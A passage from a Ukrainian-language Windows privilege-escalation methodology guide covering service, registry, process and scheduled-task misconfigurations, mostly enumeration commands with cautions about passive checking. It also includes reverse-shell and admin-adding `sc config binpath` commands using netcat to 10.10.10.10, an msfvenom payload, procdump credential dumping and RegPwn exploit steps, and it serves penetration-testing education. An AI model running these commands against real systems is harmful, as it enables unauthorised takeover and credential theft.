klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримати вміст буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Насамперед, під час переліку процесів **перевіряйте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте права на запис у папку з бінарним файлом, щоб скористатися можливими [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md): їх можна використати для підвищення привілеїв.

Слухач debugger може працювати недовго, тому його відсутність в одному пасивному знімку стану портів не доводить, що він ніколи не був доступний. Співвіднесіть будь-який виявлений слухач із його PID, власником процесу та можливістю користувача з нижчими привілеями підключитися до нього; сама назва застосунку чи прапорець налагодження не доводять можливість виконання коду між користувачами. Під час звичайного збору даних використовуйте лише пасивні методи, не надсилаючи команди debugger.

**Перевірка дозволів для бінарних файлів процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів на папки з бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати спільні бібліотеки з каталогу `dynamicpreprocessor directory`, зазначеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Якщо заплановане завдання або служба запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL каталогу модулів. Якщо ваш токен дозволяє створювати там файли, цей шлях варто перевірити на можливість виконання коду під час наступного завантаження модулів завданням або службою. Перевірте ефективні привілеї облікового запису запуску, активну конфігурацію, сумісність модулів і будь-які обмеження на заборону доступу чи спільний доступ; сам факт доступу на запис до каталогу не підтверджує ескалацію. У [документації Snort щодо динамічних препроцесорів](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з доступним для запису кореневим каталогом документів

В інсталяції Apache на Windows зіставте шлях до виконуваного файла служби та обліковий запис, від імені якого вона запускається, зі значенням `DocumentRoot` в активному `httpd.conf`. Для типової конфігурації XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто це `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, виконання коду на стороні сервера може перетнути межу привілеїв хоста. Переконайтеся, що служба запущена, що обслуговується саме цей шлях і що обробник на стороні сервера обробляє цей тип файлів; сам доступ до кореневого каталогу на запис підтверджує лише можливість створювати файли. Перевірте ACL, не створюючи пробного файла:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартного встановлення WAMP служба може вказувати на версійний `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація поруч із ним — у `conf\httpd.conf`, із типовим кореневим каталогом `C:\wamp64\www` або `C:\wamp\www`. Перевірте точний образ служби, обліковий запис запуску, ефективний `DocumentRoot` (зокрема розгортання `${INSTALL_DIR}` і перевизначення virtual host) та ACL кореневого каталогу. Можливість запису до каталогу WAMP не доводить, що Apache працює від імені `SYSTEM` або виконає надісланий файл. [В Apache описано, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Записуваний кореневий каталог IIS і мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований пул і обробник на сервері. Код у каталозі, який обслуговується, виконується від імені пулу лише за умови, що IIS обробляє цей тип файлу, а маршрут доступний. Перш ніж вважати записуваний каталог засобом виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту під час виконання, обробник і перевизначення для конкретного шляху.

Динамічна компіляція ASP.NET створює окремий шлях для перевірки: згенеровані файли в каталозі компіляції застосунку. Типово це каталог `Temporary ASP.NET Files` у відповідному каталозі встановлення .NET Framework, але параметр `<compilation tempDirectory>` застосунку може змінити його. [Microsoft описує розташування та підкаталоги для окремих застосунків](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен із нижчим рівнем привілеїв може змінювати згенерований вихідний код у кеші **конкретного** застосунку, з’ясуйте, чи компілює застосунок його повторно від імені більш привілейованої [ідентичності робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі по собі ACL файлу або каталогу не доводять можливості виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом будь-якої повторної компіляції. Переглядайте метадані лише для читання; під час переліку не запускайте компіляцію та не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до ресурсів домену як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низький рівень привілеїв. `LocalSystem` уже має високі локальні привілеї та також використовує в мережі обліковий запис комп’ютера; `LocalService` зазвичай використовує анонімні мережеві облікові дані. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft описує ці типи ідентичностей](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеву ідентичність пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть застосовуватися типові значення пулу, які відрізняються між поколіннями IIS, тож визначайте ефективну конфігурацію, а не здогадуйтеся за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю комп’ютера, оцініть права **саме цього комп’ютера** в каталозі. Для [DCSync](../active-directory-methodology/dcsync.md) потрібні права реплікації в контексті іменування домену; сам квиток облікового запису комп’ютера або роль хоста їх не доводить. Пасивний збір даних має включати перевірку конфігурації та ACL без завантаження файлів, мережевої автентифікації чи запиту квитків.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте, як значення з запиту проходить автентифікацію, розшифрування, перевірку та побудову команди. Обробник, який об’єднує декодований токен у `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft описує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що ненадійний викликач справді може вплинути на декодоване значення та звернутися до обробника, а потім визначте ефективну ідентичність пулу застосунків або імперсоновану ідентичність, а також ідентичність дочірнього процесу. Рядок вихідного коду, доступний для читання, localhost listener або сама по собі слабкість формату токена не доводять можливості виконання привілейованої команди. Переглядайте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного збору даних.

Для служби PHP у Windows шлях, контрольований запитом і переданий до [`include` або `require`](https://www.php.net/manual/en/function.include.php), може виконати PHP-файл, доступний для запису користувачу з нижчим рівнем привілеїв, від імені робочого процесу. Переконайтеся, що запит може дійти до цього оператора, визначений шлях вказує на файл, який користувач із нижчим рівнем привілеїв може змінити, а робочий процес — прочитати, що відповідні обмеження PHP щодо шляхів дозволяють включення, а робочий процес справді працює з вищими привілеями. Самі по собі loopback listener або файл, доступний для запису, не доводять наявності цього ланцюжка; перевірте вихідний код, ідентичність служби та ACL файлів, не викликаючи кінцеву точку під час пасивного збору даних.

### Пошук паролів у пам’яті

За допомогою **procdump** із sysinternals можна створити дамп пам’яті запущеного процесу. Такі служби, як FTP, зберігають **облікові дані у відкритому вигляді в пам’яті**; спробуйте створити дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Небезпечні GUI-додатки

**Програми, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1), пошукайте «командний рядок» і натисніть «Натисніть, щоб відкрити командний рядок»

### Імпорт файлів проєкту з підвищеними привілеями

Програма, яка автоматично відкриває проєкти з каталогу для скидання файлів, доступного для запису користувачу з нижчими привілеями, перетинає межу довіри до вхідних даних у контексті облікового запису імпортера. Перевірте **точний шлях, доступний для запису**, процес або завдання, що відкриває його, ефективну ідентичність і версію парсера. [Історична проблема з відкриттям/відновленням проєкту Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяла [політика вихідних підключень SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це зачіпка щодо розкриття облікових даних, а не безпосереднього доступу адміністратора: отриману відповідь має бути можливо використати через окремий авторизований або вразливий шлях, а актуальні збірки потрібно оцінювати з урахуванням фактичного стану виправлень. Не відкривайте спеціально створений проєкт під час пасивної розвідки; перевірте процес імпорту й ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) на об’єкті Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний запит лише для читання [`OpenSCManager` із цим правом доступу](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) — це зачіпка для перевірки, а не доказ того, що нову службу можна запустити. [`CreateService` повертає дескриптор](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби згодом виконує окрему перевірку доступу й може завершитися невдало, навіть якщо можна було скористатися початковим дескриптором. Окремо перевірте ефективний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску й шлях до виконуваного файлу. Не створюйте й не запускайте службу під час пасивної розвідки.

Для віддаленого встановлення служби зіставте ці права SCM із мережевим ресурсом на цілі, до якого **той самий мережевий обліковий запис** має доступ на запис, базовим ACL NTFS цього ресурсу й локальним шляхом до виконуваного файлу, який може запустити обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо наявні незвично широкі права SCM і можливість розмістити файл; адміністративний ресурс не є обов’язковою умовою. Сам по собі доступ на запис до ресурсу або зачіпка щодо права створювати служби через SCM не доводять, що нову службу можна запустити з вищою ідентичністю.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, зупинки або іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім’я допоміжного файла розв’язується в каталог, доступний для запису користувачу з нижчими привілеями, а служба працює з вищою ідентичністю, відсутній файл може бути потенційним кандидатом на підміну за певних умов. Підтвердьте **фактичний код служби або задокументований виклик допоміжного файла**, визначений шлях до виконуваного файла й порядок пошуку, права на створення в каталозі, ідентичність служби та доступний тригер життєвого циклу. Каталог служби, доступний для запису, або відсутній файл самі по собі не доводять, що служба завантажує цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби [`SERVICE_START` дозволяє передавати аргументи до `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим, ніж право керування, перевірте код служби або її задокументований інтерфейс. Якщо вона використовує аргумент, вибраний викликачем, як шлях до журналу або експорту, перевірте ідентичність служби, точний шлях від аргументу до запису, обмеження шляхів і дозволи на **створений файл**. Запис у захищений каталог може призвести до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самі по собі доступний для запису журнал або право запуску цього не забезпечують. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ файл `nsclient.ini`, доступний для читання, — це **зачіпка для перевірки конфігурації**: він може містити облікові дані вебінтерфейсу, тоді як `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, слухач WEB і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для привілейованого виконання додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), ефективне право реєструвати або змінювати команду та тригер, який запускає її від імені служби. Слухач, доступний лише через loopback, усе одно може бути доступним локальному користувачу, але самі по собі шлях до файла, пароль або слухач не доводять наявність цих прав. Під час пасивної розвідки перевіряйте метадані й дозволи, не показуючи секрети й не викликаючи веб-API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації щодо безпеки вебінтерфейсу та скриптів](https://nsclient.org/docs/setup/securing/) і [конфігурацію зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби та значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає дочірній застосунок там](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), тоді як `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківського каталогу. Локальна кінцева точка WCF або SOAP, яку надає цей дочірній процес, — окрема зачіпка для перевірки: підтвердьте, що вона доступна користувачу з нижчими привілеями, що конкретна операція приймає його вхідні дані, а дочірній процес служби виконує небезпечну операцію з вищою ідентичністю. Обліковий запис служби, URL кінцевої точки або шлях, доступний для запису, самі по собі не доводять можливість підвищення привілеїв; під час пасивної розвідки не викликайте операції служби.

Для спеціальної операції WCF простежте, чи потрапляє рядок, контрольований викликачем, у runspace PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding з обліковими даними Windows для транспортного рівня](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але право викликати **саме цю** операцію та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від вхідних даних викликувача з нижчими привілеями до `AddScript`, що виконується від імені служби з вищими привілеями, є межею виконання коду; самі по собі порт, що прослуховується, автентифікований клієнт або невикористовуваний метод у не пов’язаній збірці нічого не доводять. Під час розвідки статично перевірте розгорнуту службу, контракт, авторизацію та налаштування імперсоналізації, не викликаючи кінцеву точку.

Service Triggers дозволяють Windows запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, активуючи їхні тригери. Дивіться методи розвідки й активації тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

До інсталяцій Visual Studio з інструментами C/C++ може входити `VSStandardCollectorService150` — діагностична служба, налаштована на запуск від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) для перенаправлення скидання DACL служби використовували junction і гонку з object-manager link. Для продемонстрованого підвищення привілеїв також були потрібні доступний шлях відновлення MSI через Visual Studio Setup WMI Provider і цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивного первинного аналізу перевірте обліковий запис і шлях до бінарного файла лише цієї служби, з’ясуйте, чи існує шлях до компілятора Setup WMI, і перевірте стан виправлень установленого компонента. Запис служби, версія продукту Visual Studio або файл компілятора самі по собі не доводять, що хост вразливий. Для перевірки не потрібно запускати службу чи виконувати відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

За допомогою **sc** можна отримати інформацію про службу

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть «Authenticated Users» змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Тут можна завантажити accesschk.exe для XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо виникає ця помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Не вдалося запустити службу: її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Її можна ввімкнути за допомогоюWinvalid

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Врахуйте, що для роботи служби upnphost потрібна служба SSDPSRV (у XP SP1)**

**Ще один спосіб обійти** цю проблему — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до бінарного файлу служби**

Якщо група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити й виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапуск служби

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити за допомогою різних дозволів:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файла служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати права власника та змінювати дозволи.
- **GENERIC_WRITE**: Також надає можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також надає можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна використовувати _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, часто можна перехопити службу, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба**, або чи маєте **дозволи на запис у папку**, де розташовано бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Щоб отримати список усіх бінарних файлів, які запускаються службами, можна скористатися **wmic** (не в system32), а потім перевірити дозволи за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файла служби або каталогу, у якому він міститься. Практична схема зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файла за допомогою `sc qc <service_name>`.
2. Переконайтеся, що бінарний файл доступний для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або дійсний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження / тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію у разі збою, яка повторно запускає її, або чи можна опосередковано запустити її за допомогою програми, яка її використовує.

### Дозволи на зміну реєстру служб

Перевірте, чи можете ви змінити будь-який реєстр служб.\
Ви можете **перевірити** свої **дозволи** на **реєстр** служби за допомогою:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис у реєстрі для певного ключа служби. Сам запис ACL не доводить наявність ефективного доступу: важливі заборонні записи, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для підвищення привілеїв також потрібні придатне для використання поле конфігурації служби, спосіб запустити службу та служба, що працює від імені привілейованішого облікового запису. Див. [права на ключі реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) і [довідник із прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) від Microsoft.

Щоб змінити шлях до виконуваного файла:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка symlink у реєстрі для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для кожного користувача, які згодом копіює процес **SYSTEM** у ключ сеансу HKLM. Гонка з **символічним посиланням** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи можливість довільно записувати значення HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить перелік встановлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу або переходу до secure desktop і доступний користувачу для запису.

Сценарій експлуатації (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має бути записане від імені SYSTEM.
2. Запустіть копіювання до secure desktop (наприклад, **LockWorkstation**), щоб почався процес AT broker.
3. **Виграйте гонку**: установіть **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **посилання реєстру** на захищений цільовий шлях HKLM.
4. SYSTEM запише вибране зловмисником значення за перенаправленим шляхом HKLM.

Отримавши можливість довільно записувати значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служби:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** загальнодоступна реалізація експлойту **блокує робочу станцію** під час гонки.

Приклади інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл на реєстр, це означає, що **ви можете створювати підрозділи реєстру в ньому**. У випадку служб Windows цього **достатньо, щоб виконати довільний код:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує запустити кожен варіант шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує запустити:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб, не взяті в лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити та exploit цю вразливість за допомогою metasploit:** `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які слід виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на бінарний файл. Якщо цей файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад `-File` у PowerShell. Якщо запланований пакетний файл містить буквальний виклик PowerShell `-File`, також перевірте ACL указаного скрипту; змінні, умови та ланцюжки команд оболонки потрібно простежувати вручну. Можливість запису в скрипт або його батьківський каталог для викликувача є підставою перевірити можливість виконання між обліковими записами лише тоді, коли налаштований суб’єкт завдання відрізняється від викликувача й завдання справді доходить до цієї дії. ACL із правом лише на додавання даних може мати значення для скриптів, але попередній `exit` або інший потік керування може зробити додані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте фактичні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику контролю застосунків. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

У NTFS читабельний файл може містити іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликої доречної кількості доступних резервних копій або файлів конфігурації спершу перевірте **назви та розміри** потоків, перш ніж відкривати їхній вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на секрет, — лише зачіпка. Перевірте фактичний доступ на читання до файлу, підтримку потоків файловою системою, наявність у потоці придатних облікових даних і обліковий запис, від імені якого вони справді проходять автентифікацію. Під час звичайної інвентаризації уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні файли помічника Windows Driver Kit у запланованих завданнях

